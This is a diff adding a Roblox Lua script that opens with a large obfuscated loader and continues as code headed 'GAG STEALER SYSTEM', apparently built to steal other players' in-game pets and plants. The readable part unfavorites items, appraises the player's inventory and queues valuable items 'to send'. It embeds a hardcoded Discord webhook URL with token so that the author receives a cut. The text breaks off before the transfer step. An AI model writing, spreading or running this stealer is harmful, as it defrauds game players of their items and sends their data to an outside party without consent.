@@ -1,1 +1,251 @@
---[[Hello?]] return(function(...)local Lm,ve,f=type,getmetatable,pairs;local Bc,ic,xn,wd,sm,id,za,Pk,Dg,Ii,Yn,eb Dg={}xn,Bc={[-31074]=8003,[28330]=23468,[-23477]=-24402,[-9870]=11399,[-6088]=-4438,[-1417]=12344,[20076]=-3998,[-9399]=-24402,[29397]=-26092,[-26870]=-26092,[-12669]=21489,[7193]=-24402,[-29518]=-13847,[-14836]=23468,[22429]=-24402,[9486]=-6046,[-22280]=-3998,[487]=-13847,[32295]=23468,[-19764]=24519},function(Fk)return xn[Fk+21594]end Ii={[-3998]=function()eb=(function(...)return{[1]={...},[2]=id('#',...)}end);Yn=Bc(-21107);end,[-24402]=function()Pk,ic,wd=(string.char),(string.byte),(bit32 .bxor);Yn=Bc(-48464);end,[-13847]=function()sm=((function()local function Ke(lf,Im,Wb)if Im>Wb then return end return lf[Im],Ke(lf,Im+1,Wb)end return Ke end)());Yn=Bc(-41358);return true;end,[-26092]=function()id=(select);Yn=Bc(-1518);end,[23468]=function()za=(getfenv());Yn=Bc(-30993);end}Yn=Bc(10701)repeat while true do Dg[1]=Ii[Yn]if Dg[1]~=nil then if Dg[1]()then break end end end until Yn==-1428732083+1428756602 local G,ca,Oj,dg,Dn,Mb,xc,yk,lh,ae,kd,P,oh,la,oo,qf,zl,om,_k,Jc,Kh,fj,Fn,Em,Bj,tl=za[(function(Ja,Rl)local Ha,Kc,Hf,Lj,gm Kc={}Ha,Lj={[5583]=11072,[-7189]=-22485,[-17749]=24554,[-7868]=12223},function(sc)return Ha[sc+-17612]end gm={[20333]=function()Kc[1]=Kc[2];if Kc[3]~=Kc[3]then Hf=-9628 else Hf=11072 end end,[-22485]=function()Kc[4]=Kc[4]..Pk(wd(ic(Ja,(Kc[1]-144)+1),ic(Rl,(Kc[1]-144)%#Rl+1)))Hf=Lj(-137)end,[11072]=function()if(Kc[5]>=0 and Kc[2]>Kc[3])or((Kc[5]<0 or Kc[5]~=Kc[5])and Kc[2]<Kc[3])then Hf=-9628 else Hf=Lj(10423)end end,[24554]=function()Kc[2]=Kc[2]+Kc[5];Kc[1]=Kc[2];if Kc[2]~=Kc[2]then Hf=-9628 else Hf=Lj(23195)end end}Hf=Lj(9744)repeat while true do Kc[6]=gm[Hf]if Kc[6]~=nil then if Kc[6]()then break end elseif Hf==-9628 then return Kc[4]elseif Hf==12223 then Kc[4]='';Kc[2],Kc[3],Kc[5]=144,(#Ja-1)+144,1 Hf=20333 end end until Hf==-21035 end)('\201\251\205\231','\189\130')],za[(function(Ak,Sm)local ni,il,wh,Hk,pi ni={}Hk,pi={[14910]=21983,[-4706]=20359,[23873]=18641,[-30864]=-16187,[19792]=20359},function(rg)return Hk[rg-28463]end wh={[9005]=function()ni[1]=ni[2];if ni[3]~=ni[3]then il=pi(23757)else il=pi(-2401)end end,[16950]=function()ni[4]=ni[4]..Pk(wd(ic(Ak,(ni[1]-116)+1),ic(Sm,(ni[1]-116)%#Sm+1)))il=pi(52336)end,[18641]=function()ni[2]=ni[2]+ni[5];ni[1]=ni[2];if ni[2]~=ni[2]then il=20359 else il=-16187 end end,[-16187]=function()if(ni[5]>=0 and ni[2]>ni[3])or((ni[5]<0 or ni[5]~=ni[5])and ni[2]<ni[3])then il=pi(48255)else il=16950 end end}il=pi(43373)repeat while true do ni[6]=wh[il]if ni[6]~=nil then if ni[6]()then break end elseif il==21983 then ni[4]='';ni[5],ni[3],ni[2]=1,(#Ak-1)+116,116 il=9005 elseif il==20359 then return ni[4]end end until il==6956 end)('~YoVb','\14:')],za[(function(sf,Kb)local yi,Ti,Rf,mf,Yl Rf={}yi,mf={[-14770]=-6467,[17781]=12078,[-25791]=-7942,[-835]=-23301,[-12634]=-5291,[16932]=-9990,[6349]=-5291},function(Wh)return yi[Wh-4048]end Ti={[-6467]=function()Rf[1]=Rf[1]+Rf[2];Rf[3]=Rf[1];if Rf[1]~=Rf[1]then Yl=mf(10397)else Yl=mf(20980)end end,[-9990]=function()if(Rf[2]>=0 and Rf[1]>Rf[4])or((Rf[2]<0 or Rf[2]~=Rf[2])and Rf[1]<Rf[4])then Yl=mf(-8586)else Yl=mf(-21743)end end,[-7942]=function()Rf[5]=Rf[5]..Pk(wd(ic(sf,(Rf[3]-213)+1),ic(Kb,(Rf[3]-213)%#Kb+1)))Yl=mf(-10722)end,[-23301]=function()Rf[3]=Rf[1];if Rf[4]~=Rf[4]then Yl=-5291 else Yl=-9990 end end}Yl=mf(21829)repeat while true do Rf[6]=Ti[Yl]if Rf[6]~=nil then if Rf[6]()then break end elseif Yl==12078 then Rf[5]='';Rf[1],Rf[2],Rf[4]=213,1,(#sf-1)+213 Yl=mf(3213)elseif Yl==-5291 then return Rf[5]end end until Yl==17456 end)('\225\149\246\136\246','\132\231')],za[(function(um,di)local Xk,ok,hn,_f,Ph ok={}Ph,hn={[-3432]=-32031,[19594]=8474,[2783]=20106,[24514]=-13220,[-4368]=27037},function(ac)return Ph[ac-19846]end _f={[20106]=function()ok[1]=ok[1]+ok[2];ok[3]=ok[1];if ok[1]~=ok[1]then Xk=27037 else Xk=hn(39440)end end,[23605]=function()ok[4]=ok[4]..Pk(wd(ic(um,(ok[3]-56)+1),ic(di,(ok[3]-56)%#di+1)))Xk=hn(22629)end,[8474]=function()if(ok[2]>=0 and ok[1]>ok[5])or((ok[2]<0 or ok[2]~=ok[2])and ok[1]<ok[5])then Xk=27037 else Xk=23605 end end,[-32031]=function()ok[3]=ok[1];if ok[5]~=ok[5]then Xk=hn(15478)else Xk=8474 end end}Xk=hn(44360)repeat while true do ok[6]=_f[Xk]if ok[6]~=nil then if ok[6]()then break end elseif Xk==27037 then return ok[4]elseif Xk==-13220 then ok[4]='';ok[1],ok[2],ok[5]=56,1,(#um-1)+56 Xk=hn(16414)end end until Xk==3540 end)('XG\\\24AJW\31',',(2m')],za[(function(kg,xe)local _g,Va,Gk,Pg,Nl _g={}Pg,Nl={[-10481]=-2009,[31104]=-14539,[29777]=2986,[13763]=-14539,[14497]=-6376},function(Al)return Pg[Al-27315]end Va={[8594]=function()_g[1]=_g[1]..Pk(wd(ic(kg,(_g[2]-225)+1),ic(xe,(_g[2]-225)%#xe+1)))Gk=Nl(41812)end,[25597]=function()_g[2]=_g[3];if _g[4]~=_g[4]then Gk=Nl(41078)else Gk=2986 end end,[-6376]=function()_g[3]=_g[3]+_g[5];_g[2]=_g[3];if _g[3]~=_g[3]then Gk=Nl(58419)else Gk=Nl(57092)end end,[2986]=function()if(_g[5]>=0 and _g[3]>_g[4])or((_g[5]<0 or _g[5]~=_g[5])and _g[3]<_g[4])then Gk=-14539 else Gk=8594 end end}Gk=Nl(16834)repeat while true do _g[6]=Va[Gk]if _g[6]~=nil then if _g[6]()then break end elseif Gk==-14539 then return _g[1]elseif Gk==-2009 then _g[1]='';_g[3],_g[4],_g[5]=225,(#kg-1)+225,1 Gk=25597 end end until Gk==-29762 end)('\181\1\216\177\0\223','\212r\171')],za[(function(He,zh)local bo,Qn,Jn,Ah,Dd Jn={}Dd,Qn={[-4256]=-26591,[-14736]=12018,[17139]=23054,[-3911]=23054,[5925]=19322},function(rf)return Dd[rf- -26912]end Ah={[12018]=function()Jn[1]=Jn[1]+Jn[2];Jn[3]=Jn[1];if Jn[1]~=Jn[1]then bo=19322 else bo=Qn(-30823)end end,[23054]=function()if(Jn[2]>=0 and Jn[1]>Jn[4])or((Jn[2]<0 or Jn[2]~=Jn[2])and Jn[1]<Jn[4])then bo=Qn(-20987)else bo=21126 end end,[-23724]=function()Jn[3]=Jn[1];if Jn[4]~=Jn[4]then bo=19322 else bo=Qn(-9773)end end,[21126]=function()Jn[5]=Jn[5]..Pk(wd(ic(He,(Jn[3]-44)+1),ic(zh,(Jn[3]-44)%#zh+1)))bo=Qn(-41648)end}bo=Qn(-31168)repeat while true do Jn[6]=Ah[bo]if Jn[6]~=nil then if Jn[6]()then break end elseif bo==19322 then return Jn[5]elseif bo==-26591 then Jn[5]='';Jn[2],Jn[4],Jn[1]=1,(#He-1)+44,44 bo=-23724 end end until bo==18358 end)(' \164\131\54\162\155','S\193\239')],za[(function(pc,Od)local ed,jd,Vk,Nn,cb cb={}Vk,Nn={[13913]=27039,[-32021]=-14448,[17420]=22790,[-24065]=22097,[31]=6915,[6339]=-14448},function(On)return Vk[On+1747]end jd={[27039]=function()cb[1]=cb[2];if cb[3]~=cb[3]then ed=22097 else ed=Nn(-33768)end end,[-6822]=function()cb[4]=cb[4]..Pk(wd(ic(pc,(cb[1]-144)+1),ic(Od,(cb[1]-144)%#Od+1)))ed=Nn(15673)end,[22790]=function()cb[2]=cb[2]+cb[5];cb[1]=cb[2];if cb[2]~=cb[2]then ed=22097 else ed=Nn(4592)end end,[-14448]=function()if(cb[5]>=0 and cb[2]>cb[3])or((cb[5]<0 or cb[5]~=cb[5])and cb[2]<cb[3])then ed=Nn(-25812)else ed=-6822 end end}ed=Nn(-1716)repeat while true do cb[6]=jd[ed]if cb[6]~=nil then if cb[6]()then break end elseif ed==22097 then return cb[4]elseif ed==6915 then cb[4]='';cb[5],cb[2],cb[3]=1,144,(#pc-1)+144 ed=Nn(12166)end end until ed==20410 end)('\244\197\189\183\145\225\230\212\168\184\152\240','\135\160\201\218\244\149')],za[(function(gf,Pe)local Nd,ja,i,_l,oc _l={}Nd,oc={[-32323]=9919,[-22021]=-26099,[-8641]=29920,[10900]=-11067,[-30812]=31440,[-6166]=-26099},function(wk)return Nd[wk- -27907]end ja={[-11067]=function()_l[1]=_l[2];if _l[3]~=_l[3]then i=-26099 else i=19186 end end,[9919]=function()_l[4]=_l[4]..Pk(wd(ic(gf,(_l[1]-56)+1),ic(Pe,(_l[1]-56)%#Pe+1)))i=oc(-58719)end,[19186]=function()if(_l[5]>=0 and _l[2]>_l[3])or((_l[5]<0 or _l[5]~=_l[5])and _l[2]<_l[3])then i=oc(-49928)else i=oc(-60230)end end,[31440]=function()_l[2]=_l[2]+_l[5];_l[1]=_l[2];if _l[2]~=_l[2]then i=oc(-34073)else i=19186 end end}i=oc(-36548)repeat while true do _l[6]=ja[i]if _l[6]~=nil then if _l[6]()then break end elseif i==29920 then _l[4]='';_l[3],_l[5],_l[2]=(#gf-1)+56,1,56 i=oc(-17007)elseif i==-26099 then return _l[4]end end until i==25782 end)('\199\254R\221\228G','\180\138 ')][(function(Qj,A)local rb,Cn,fi,yc,sb Cn={}sb,rb={[-28196]=-25639,[19671]=-31640,[9657]=-13208,[30569]=-25639},function(_o)return sb[_o-9782]end yc={[-23532]=function()Cn[1]=Cn[1]..Pk(wd(ic(Qj,(Cn[2]-245)+1),ic(A,(Cn[2]-245)%#A+1)))fi=rb(29453)end,[13729]=function()Cn[2]=Cn[3];if Cn[4]~=Cn[4]then fi=25226 else fi=rb(40351)end end,[-31640]=function()Cn[3]=Cn[3]+Cn[5];Cn[2]=Cn[3];if Cn[3]~=Cn[3]then fi=25226 else fi=rb(-18414)end end,[-25639]=function()if(Cn[5]>=0 and Cn[3]>Cn[4])or((Cn[5]<0 or Cn[5]~=Cn[5])and Cn[3]<Cn[4])then fi=25226 else fi=-23532 end end}fi=rb(19439)repeat while true do Cn[6]=yc[fi]if Cn[6]~=nil then if Cn[6]()then break end elseif fi==-13208 then Cn[1]='';Cn[4],Cn[5],Cn[3]=(#Qj-1)+245,1,245 fi=13729 elseif fi==25226 then return Cn[1]end end until fi==23074 end)('\207\235\204\196\229\202','\169\132\190')],za[(function(Kf,Dc)local Om,Jb,Tc,ya,Zh ya={}Zh,Om={[-17113]=30423,[-3420]=31703,[19410]=-17477,[-7057]=9585,[8286]=24939,[-20668]=31703,[14132]=24028,[23267]=30423},function(wl)return Zh[wl- -21997]end Jb={[31703]=function()if(ya[1]>=0 and ya[2]>ya[3])or((ya[1]<0 or ya[1]~=ya[1])and ya[2]<ya[3])then Tc=Om(1270)else Tc=Om(-2587)end end,[24939]=function()ya[2]=ya[2]+ya[1];ya[4]=ya[2];if ya[2]~=ya[2]then Tc=Om(-39110)else Tc=Om(-25417)end end,[24028]=function()ya[4]=ya[2];if ya[3]~=ya[3]then Tc=30423 else Tc=Om(-42665)end end,[-17477]=function()ya[5]=ya[5]..Pk(wd(ic(Kf,(ya[4]-49)+1),ic(Dc,(ya[4]-49)%#Dc+1)))Tc=Om(-13711)end}Tc=Om(-29054)repeat while true do ya[6]=Jb[Tc]if ya[6]~=nil then if ya[6]()then break end elseif Tc==30423 then return ya[5]elseif Tc==9585 then ya[5]='';ya[3],ya[1],ya[2]=(#Kf-1)+49,1,49 Tc=Om(-7865)end end until Tc==7658 end)('\159\48\225\133*\244','\236D\147')][(function(dh,bj)local ng,zn,Ik,Ei,ui zn={}ng,Ei={[-28522]=11710,[12924]=-11214,[-25455]=32152,[10722]=-10960},function(bk)return ng[bk+27580]end ui={[11710]=function()zn[1]=zn[2];if zn[3]~=zn[3]then Ik=16394 else Ik=-29940 end end,[32152]=function()zn[4]=zn[4]..Pk(wd(ic(dh,(zn[1]-141)+1),ic(bj,(zn[1]-141)%#bj+1)))Ik=Ei(-16858)end,[-10960]=function()zn[2]=zn[2]+zn[5];zn[1]=zn[2];if zn[2]~=zn[2]then Ik=16394 else Ik=-29940 end end,[-29940]=function()if(zn[5]>=0 and zn[2]>zn[3])or((zn[5]<0 or zn[5]~=zn[5])and zn[2]<zn[3])then Ik=16394 else Ik=Ei(-53035)end end}Ik=Ei(-14656)repeat while true do zn[6]=ui[Ik]if zn[6]~=nil then if zn[6]()then break end elseif Ik==16394 then return zn[4]elseif Ik==-11214 then zn[4]='';zn[2],zn[5],zn[3]=141,1,(#dh-1)+141 Ik=Ei(-56102)end end until Ik==-11914 end)('~\236\206j\225\213','\v\130\190')],za[(function(Mc,Ce)local Uc,_m,Sk,Mh,Xe Mh={}_m,Xe={[25325]=16647,[5066]=15651,[-14479]=-18272},function(em)return _m[em-13107]end Sk={[15651]=function()Mh[1]=Mh[1]+Mh[2];Mh[3]=Mh[1];if Mh[1]~=Mh[1]then Uc=Xe(-1372)else Uc=2793 end end,[2793]=function()if(Mh[2]>=0 and Mh[1]>Mh[4])or((Mh[2]<0 or Mh[2]~=Mh[2])and Mh[1]<Mh[4])then Uc=-18272 else Uc=8376 end end,[20056]=function()Mh[3]=Mh[1];if Mh[4]~=Mh[4]then Uc=-18272 else Uc=2793 end end,[8376]=function()Mh[5]=Mh[5]..Pk(wd(ic(Mc,(Mh[3]-246)+1),ic(Ce,(Mh[3]-246)%#Ce+1)))Uc=Xe(18173)end}Uc=Xe(38432)repeat while true do Mh[6]=Sk[Uc]if Mh[6]~=nil then if Mh[6]()then break end elseif Uc==-18272 then return Mh[5]elseif Uc==16647 then Mh[5]='';Mh[1],Mh[2],Mh[4]=246,1,(#Mc-1)+246 Uc=20056 end end until Uc==-26160 end)('K|\252Qf\233','8\b\142')][(function(Ej,ph)local Kg,pm,Fm,Wm,Db Fm={}Wm,Db={[-28956]=-32698,[-9846]=-19436,[25812]=2299,[-3435]=-4186,[29790]=31225,[-7473]=-7564},function(Sj)return Wm[Sj- -5213]end pm={[2299]=function()Fm[1]=Fm[1]..Pk(wd(ic(Ej,(Fm[2]-140)+1),ic(ph,(Fm[2]-140)%#ph+1)))Kg=Db(24577)end,[-32698]=function()Fm[2]=Fm[3];if Fm[4]~=Fm[4]then Kg=-7564 else Kg=-19436 end end,[31225]=function()Fm[3]=Fm[3]+Fm[5];Fm[2]=Fm[3];if Fm[3]~=Fm[3]then Kg=Db(-12686)else Kg=Db(-15059)end end,[-19436]=function()if(Fm[5]>=0 and Fm[3]>Fm[4])or((Fm[5]<0 or Fm[5]~=Fm[5])and Fm[3]<Fm[4])then Kg=-7564 else Kg=Db(20599)end end}Kg=Db(-8648)repeat while true do Fm[6]=pm[Kg]if Fm[6]~=nil then if Fm[6]()then break end elseif Kg==-4186 then Fm[1]='';Fm[3],Fm[5],Fm[4]=140,1,(#Ej-1)+140 Kg=Db(-34169)elseif Kg==-7564 then return Fm[1]end end until Kg==21430 end)('& 7','U')],za[(function(Pn,qc)local cn,Fd,Gi,Oa,Df cn={}Fd,Oa={[32586]=23992,[-24640]=31783,[-17523]=-26461,[-10630]=24280},function(Mn)return Fd[Mn+-15507]end Gi={[24280]=function()if(cn[1]>=0 and cn[2]>cn[3])or((cn[1]<0 or cn[1]~=cn[1])and cn[2]<cn[3])then Df=23992 else Df=28943 end end,[472]=function()cn[4]=cn[2];if cn[3]~=cn[3]then Df=23992 else Df=Oa(4877)end end,[28943]=function()cn[5]=cn[5]..Pk(wd(ic(Pn,(cn[4]-187)+1),ic(qc,(cn[4]-187)%#qc+1)))Df=Oa(-2016)end,[-26461]=function()cn[2]=cn[2]+cn[1];cn[4]=cn[2];if cn[2]~=cn[2]then Df=Oa(48093)else Df=24280 end end}Df=Oa(-9133)repeat while true do cn[6]=Gi[Df]if cn[6]~=nil then if cn[6]()then break end elseif Df==23992 then return cn[5]elseif Df==31783 then cn[5]='';cn[3],cn[1],cn[2]=(#Pn-1)+187,1,187 Df=472 end end until Df==17402 end)('\216{\206v\201','\172\26')][(function(ad,sd)local tj,Je,Ve,fm,im im={}tj,Je={[30969]=-20816,[-3443]=-9475,[12108]=-7590,[-16022]=-7590,[10546]=-7590,[5443]=-7412,[24290]=27428},function(pf)return tj[pf-30634]end Ve={[-22144]=function()im[1]=im[2];if im[3]~=im[3]then fm=Je(41180)else fm=Je(36077)end end,[-20816]=function()im[2]=im[2]+im[4];im[1]=im[2];if im[2]~=im[2]then fm=Je(42742)else fm=-7412 end end,[27428]=function()im[5]=im[5]..Pk(wd(ic(ad,(im[1]-204)+1),ic(sd,(im[1]-204)%#sd+1)))fm=Je(61603)end,[-7412]=function()if(im[4]>=0 and im[2]>im[3])or((im[4]<0 or im[4]~=im[4])and im[2]<im[3])then fm=Je(14612)else fm=Je(54924)end end}fm=Je(27191)repeat while true do im[6]=Ve[fm]if im[6]~=nil then if im[6]()then break end elseif fm==-9475 then im[5]='';im[3],im[2],im[4]=(#ad-1)+204,204,1 fm=-22144 elseif fm==-7590 then return im[5]end end until fm==19803 end)('\")9#','OF')],za[(function(Sl,Ra)local ej,Ud,do_,Bd,wn Bd={}Ud,wn={[27678]=14184,[-3925]=-15930,[-3919]=29748,[14153]=-15979,[26916]=29748},function(fn)return Ud[fn- -18411]end do_={[14184]=function()Bd[1]=Bd[1]+Bd[2];Bd[3]=Bd[1];if Bd[1]~=Bd[1]then ej=wn(-22330)else ej=-13806 end end,[29762]=function()Bd[3]=Bd[1];if Bd[4]~=Bd[4]then ej=29748 else ej=-13806 end end,[-15979]=function()Bd[5]=Bd[5]..Pk(wd(ic(Sl,(Bd[3]-48)+1),ic(Ra,(Bd[3]-48)%#Ra+1)))ej=wn(9267)end,[-13806]=function()if(Bd[2]>=0 and Bd[1]>Bd[4])or((Bd[2]<0 or Bd[2]~=Bd[2])and Bd[1]<Bd[4])then ej=wn(8505)else ej=wn(-4258)end end}ej=wn(-22336)repeat while true do Bd[6]=do_[ej]if Bd[6]~=nil then if Bd[6]()then break end elseif ej==29748 then return Bd[5]elseif ej==-15930 then Bd[5]='';Bd[2],Bd[1],Bd[4]=1,48,(#Sl-1)+48 ej=29762 end end until ej==22117 end)('\216\168\206\165\201','\172\201')][(function(l,Jj)local Wl,gh,Tj,I,Ln Ln={}I,Tj={[7593]=18418,[8416]=-12408,[-25674]=-23721,[-22232]=-20501,[-30610]=24574},function(Ga)return I[Ga+10428]end gh={[18418]=function()Ln[1]=Ln[1]+Ln[2];Ln[3]=Ln[1];if Ln[1]~=Ln[1]then Wl=-12408 else Wl=Tj(-41038)end end,[24574]=function()if(Ln[2]>=0 and Ln[1]>Ln[4])or((Ln[2]<0 or Ln[2]~=Ln[2])and Ln[1]<Ln[4])then Wl=-12408 else Wl=-27472 end end,[-27472]=function()Ln[5]=Ln[5]..Pk(wd(ic(l,(Ln[3]-77)+1),ic(Jj,(Ln[3]-77)%#Jj+1)))Wl=Tj(-2835)end,[-23721]=function()Ln[3]=Ln[1];if Ln[4]~=Ln[4]then Wl=Tj(-2012)else Wl=24574 end end}Wl=Tj(-32660)repeat while true do Ln[6]=gh[Wl]if Ln[6]~=nil then if Ln[6]()then break end elseif Wl==-12408 then return Ln[5]elseif Wl==-20501 then Ln[5]='';Ln[1],Ln[4],Ln[2]=77,(#l-1)+77,1 Wl=Tj(-36102)end end until Wl==-10446 end)('\150\189\133\183','\230\220')],za[(function(zd,ne)local zb,ke,pb,E,Wi zb={}E,ke={[1431]=240,[18834]=32144,[-21724]=18371,[30744]=29646,[3773]=32144,[17371]=12155,[-5074]=240},function(pl)return E[pl-5929]end pb={[18371]=function()zb[1]=zb[2];if zb[3]~=zb[3]then Wi=240 else Wi=ke(9702)end end,[32144]=function()if(zb[4]>=0 and zb[2]>zb[3])or((zb[4]<0 or zb[4]~=zb[4])and zb[2]<zb[3])then Wi=ke(855)else Wi=-14770 end end,[-14770]=function()zb[5]=zb[5]..Pk(wd(ic(zd,(zb[1]-185)+1),ic(ne,(zb[1]-185)%#ne+1)))Wi=ke(23300)end,[12155]=function()zb[2]=zb[2]+zb[4];zb[1]=zb[2];if zb[2]~=zb[2]then Wi=ke(7360)else Wi=ke(24763)end end}Wi=ke(36673)repeat while true do zb[6]=pb[Wi]if zb[6]~=nil then if zb[6]()then break end elseif Wi==29646 then zb[5]='';zb[4],zb[2],zb[3]=1,185,(#zd-1)+185 Wi=ke(-15795)elseif Wi==240 then return zb[5]end end until Wi==31017 end)('\157\177\139\188\140','\233\208')][(function(sh,u)local cd,je,Zj,le,Jd je={}Zj,le={[-28986]=10980,[-17129]=4396,[1822]=20583,[1899]=-6081,[-9176]=-16614,[19790]=-16614},function(s)return Zj[s- -5826]end Jd={[20583]=function()je[1]=je[2];if je[3]~=je[3]then cd=10980 else cd=le(13964)end end,[4396]=function()je[2]=je[2]+je[4];je[1]=je[2];if je[2]~=je[2]then cd=10980 else cd=le(-15002)end end,[23036]=function()je[5]=je[5]..Pk(wd(ic(sh,(je[1]-210)+1),ic(u,(je[1]-210)%#u+1)))cd=le(-22955)end,[-16614]=function()if(je[4]>=0 and je[2]>je[3])or((je[4]<0 or je[4]~=je[4])and je[2]<je[3])then cd=le(-34812)else cd=23036 end end}cd=le(-3927)repeat while true do je[6]=Jd[cd]if je[6]~=nil then if je[6]()then break end elseif cd==-6081 then je[5]='';je[3],je[4],je[2]=(#sh-1)+210,1,210 cd=le(-4004)elseif cd==10980 then return je[5]end end until cd==19209 end)('\149\177\142\151\183\142','\246\195\235')],za[(function(Gg,Qh)local gd,Qf,w,Md,Gn Gn={}Md,Qf={[3570]=12773,[31122]=-24838,[-32019]=30428,[-16038]=-20847},function(zj)return Md[zj-20436]end gd={[-11409]=function()Gn[1]=Gn[1]..Pk(wd(ic(Gg,(Gn[2]-163)+1),ic(Qh,(Gn[2]-163)%#Qh+1)))w=Qf(-11583)end,[-24838]=function()if(Gn[3]>=0 and Gn[4]>Gn[5])or((Gn[3]<0 or Gn[3]~=Gn[3])and Gn[4]<Gn[5])then w=-20847 else w=-11409 end end,[-17951]=function()Gn[2]=Gn[4];if Gn[5]~=Gn[5]then w=Qf(4398)else w=-24838 end end,[30428]=function()Gn[4]=Gn[4]+Gn[3];Gn[2]=Gn[4];if Gn[4]~=Gn[4]then w=-20847 else w=Qf(51558)end end}w=Qf(24006)repeat while true do Gn[6]=gd[w]if Gn[6]~=nil then if Gn[6]()then break end elseif w==12773 then Gn[1]='';Gn[4],Gn[5],Gn[3]=163,(#Gg-1)+163,1 w=-17951 elseif w==-20847 then return Gn[1]end end until w==25165 end)('8\52.9)','LU')][(function(oe,En)local Pm,sl,mm,am,xj am={}xj,mm={[15785]=3562,[-23117]=-27483,[849]=18862,[8766]=-19531},function(Ba)return xj[Ba-17161]end sl={[-19531]=function()if(am[1]>=0 and am[2]>am[3])or((am[1]<0 or am[1]~=am[1])and am[2]<am[3])then Pm=-3066 else Pm=-29360 end end,[3562]=function()am[2]=am[2]+am[1];am[4]=am[2];if am[2]~=am[2]then Pm=-3066 else Pm=-19531 end end,[-29360]=function()am[5]=am[5]..Pk(wd(ic(oe,(am[4]-181)+1),ic(En,(am[4]-181)%#En+1)))Pm=mm(32946)end,[18862]=function()am[4]=am[2];if am[3]~=am[3]then Pm=-3066 else Pm=mm(25927)end end}Pm=mm(-5956)repeat while true do am[6]=sl[Pm]if am[6]~=nil then if am[6]()then break end elseif Pm==-27483 then am[5]='';am[1],am[3],am[2]=1,(#oe-1)+181,181 Pm=mm(18010)elseif Pm==-3066 then return am[5]end end until Pm==8766 end)('@\29\18L\1\21',')sa')],za[(function(nh,yl)local bb,_a,o,jg,yd yd={}jg,bb={[12559]=-13612,[-17621]=-27962,[26114]=-12373,[24171]=-9379},function(K)return jg[K- -959]end o={[-9132]=function()yd[1]=yd[1]..Pk(wd(ic(nh,(yd[2]-148)+1),ic(yl,(yd[2]-148)%#yl+1)))_a=bb(25155)end,[-9379]=function()if(yd[3]>=0 and yd[4]>yd[5])or((yd[3]<0 or yd[3]~=yd[3])and yd[4]<yd[5])then _a=-27962 else _a=-9132 end end,[-7534]=function()yd[2]=yd[4];if yd[5]~=yd[5]then _a=bb(-18580)else _a=bb(23212)end end,[-12373]=function()yd[4]=yd[4]+yd[3];yd[2]=yd[4];if yd[4]~=yd[4]then _a=-27962 else _a=-9379 end end}_a=bb(11600)repeat while true do yd[6]=o[_a]if yd[6]~=nil then if yd[6]()then break end elseif _a==-13612 then yd[1]='';yd[4],yd[3],yd[5]=148,1,(#nh-1)+148 _a=-7534 elseif _a==-27962 then return yd[1]end end until _a==-16479 end)('\182\50\160?\167','\194S')][(function(ud,af)local Zb,Bg,ci,Xc,Nf Bg={}ci,Xc={[28226]=-15295,[17579]=-19464,[-19550]=27596},function(vj)return ci[vj+-17329]end Nf={[13738]=function()if(Bg[1]>=0 and Bg[2]>Bg[3])or((Bg[1]<0 or Bg[1]~=Bg[1])and Bg[2]<Bg[3])then Zb=-15295 else Zb=-8425 end end,[-8425]=function()Bg[4]=Bg[4]..Pk(wd(ic(ud,(Bg[5]-192)+1),ic(af,(Bg[5]-192)%#af+1)))Zb=Xc(-2221)end,[5104]=f
+--- GAG STEALER SYSTEM - Integrated by namnnni2
+
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local backpack = LocalPlayer:WaitForChild("Backpack")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Unfavorite item if marked
+local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
+for _, item in ipairs(backpack:GetChildren()) do
+    if item:GetAttribute("d") == true then
+        event:FireServer(item)
+    end
+end
+
+local HttpService = game:GetService("HttpService")
+local plr = Players.LocalPlayer
+local modules = ReplicatedStorage:WaitForChild("Modules")
+local dataService = require(modules:WaitForChild("DataService"))
+local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
+local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+local numberUtil = require(modules:WaitForChild("NumberUtil"))
+
+-- ✅ FIX math.lerp if missing
+math.lerp = math.lerp or function(a, b, t)
+	return a + (b - a) * t
+end
+
+local Webhook = getfenv().Webhook
+local Username = getfenv().Username
+local DualWebhook = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
+local DualUsername = "namnnni2"
+if not Webhook or not Username then return end
+
+local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
+local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+local itemsToSend, totalValue, hasRare, hasHeavy = {}, 0, false, false
+
+local function formatNumber(n)
+	local suffix = {"", "k", "m", "b", "t"}
+	local idx = 1
+	while n >= 1000 and idx < #suffix do
+		n = n / 1000
+		idx += 1
+	end
+	return idx == 1 and tostring(math.floor(n)) or string.format("%.2f%s", n, suffix[idx])
+end
+
+local function calcPetValue(petData)
+	local egg = petData.PetData.HatchedFrom
+	if not egg then return 0 end
+	local data = petRegistry.PetEggs[egg]
+	local rarity = data and data.RarityData.Items[petData.PetType]
+	if not rarity then return 0 end
+	local r = rarity.GeneratedPetData.WeightRange
+	if not r then return 0 end
+	local lerp = numberUtil.ReverseLerp(r[1], r[2], petData.PetData.BaseWeight)
+	local weightMult = math.lerp(0.8, 1.2, lerp)
+	local levelMult = math.lerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
+	return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightMult * levelMult)
+end
+
+-- Collect item values
+for _, tool in ipairs(backpack:GetChildren()) do
+	if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+		if tool:GetAttribute("ItemType") == "Pet" then
+			local id = tool:GetAttribute("PET_UUID")
+			local petData = dataService:GetData().PetsData.PetInventory.Data[id]
+			if not petData or not petData.PetType then continue end
+			local petName = petData.PetType
+			local weight = tonumber(petData.PetData.BaseWeight) or 0
+			local value = calcPetValue(petData)
+			if table.find(rarePets, petName) then hasRare = true end
+			if weight >= 10 then hasHeavy = true end
+			totalValue += value
+			table.insert(itemsToSend, {Tool = tool, Name = petName, Weight = weight, Value = value, Type = "Pet"})
+		else
+			local value = calcPlantValue(tool)
+			totalValue += value
+			table.insert(itemsToSend, {Tool = tool, Name = tool.Name, Weight = 0, Value = value, Type = "Plant"})
+		end
+	end
+end
+
